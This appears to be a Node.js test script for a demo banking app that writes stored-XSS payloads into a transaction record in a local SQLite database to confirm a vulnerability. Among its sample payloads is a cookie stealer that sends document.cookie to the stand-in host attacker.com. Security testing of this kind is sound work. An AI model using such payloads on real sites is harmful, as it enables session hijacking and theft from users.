/**
 * Script to inject XSS payload into transaction description for testing
 * Usage: node scripts/test-xss.js <account_id>
 */

const Database = require("better-sqlite3");
const path = require("path");

const dbPath = path.join(__dirname, "..", "bank.db");
const db = new Database(dbPath);

const accountId = process.argv[2];

if (!accountId) {
  console.log("Usage: node scripts/test-xss.js <account_id>");
  console.log("\nFirst, find your account_id:");
  console.log("1. Check the dashboard URL or");
  console.log("2. Run: node -e \"const db = require('better-sqlite3')('bank.db'); console.log(db.prepare('SELECT id, user_id, account_number FROM accounts').all());\"");
  process.exit(1);
}

// XSS payload examples - choose one:
const xssPayloads = {
  // Simple alert (most visible)
  alert: '<img src=x onerror="alert(\'XSS Vulnerability Confirmed!\')">',
  
  // Steal cookies (realistic attack)
  cookieStealer: '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">',
  
  // DOM manipulation
  domManipulation: '<script>document.body.style.backgroundColor="red"; alert("XSS!");</script>',
  
  // Console log (for testing)
  consoleLog: '<img src=x onerror="console.log(\'XSS executed in transaction description\')">',
};

// Insert a transaction with XSS payload
const payload = xssPayloads.alert; // Change this to test different payloads

try {
  const result = db
    .prepare(
      `INSERT INTO transactions (account_id, type, amount, description, status, created_at, processed_at)
       VALUES (?, 'deposit', 100.00, ?, 'completed', datetime('now'), datetime('now'))`
    )
    .run(accountId, payload);

  console.log(`✅ XSS payload injected successfully!`);
  console.log(`   Transaction ID: ${result.lastInsertRowid}`);
  console.log(`   Payload: ${payload}`);
  console.log(`\n📋 Next steps:`);
  console.log(`   1. Open your browser and navigate to the dashboard`);
  console.log(`   2. View the transaction list`);
  console.log(`   3. Open Chrome DevTools (F12)`);
  console.log(`   4. Check the Console tab - you should see the alert or console log`);
  console.log(`   5. Inspect the DOM in Elements tab to see the injected HTML`);
} catch (error) {
  console.error("❌ Error:", error.message);
  if (error.message.includes("FOREIGN KEY")) {
    console.error("   Make sure the account_id exists in the accounts table");
  }
} finally {
  db.close();
}

